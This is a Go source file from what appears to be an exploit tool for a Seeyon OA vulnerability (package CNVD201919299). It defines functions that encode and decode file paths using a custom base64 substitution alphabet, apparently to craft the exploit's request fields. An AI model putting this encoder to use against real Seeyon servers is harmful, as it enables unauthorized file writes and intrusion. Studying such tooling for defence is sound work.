package CNVD201919299

import (
	"SeeyonExploit/utils"
	"encoding/base64"
	"strings"
)

func Dec(cipherlist string) string {
	//a为变种base64的映射表，a和b对应位替换即可还原为正常base64
	var a = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
	var b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
	m := ""
	for i := 0; i < len(cipherlist); i++ {
		pos := strings.Index(a, string(cipherlist[i]))
		m += string(b[pos])
	}
	decodeBytes, err := base64.StdEncoding.DecodeString(m)
	utils.PanicErr(err)
	return string(decodeBytes)
}
func Enc(filename string, path string) string {
	var a = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
	var b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
	filename = path + filename
	encodeBytes := base64.StdEncoding.EncodeToString([]byte(filename))
	encodeStr := string(encodeBytes)
	m := ""
	for i := 0; i < len(encodeStr); i++ {
		pos := strings.Index(b, string(encodeStr[i]))
		m += string(a[pos])
	}
	return m
}
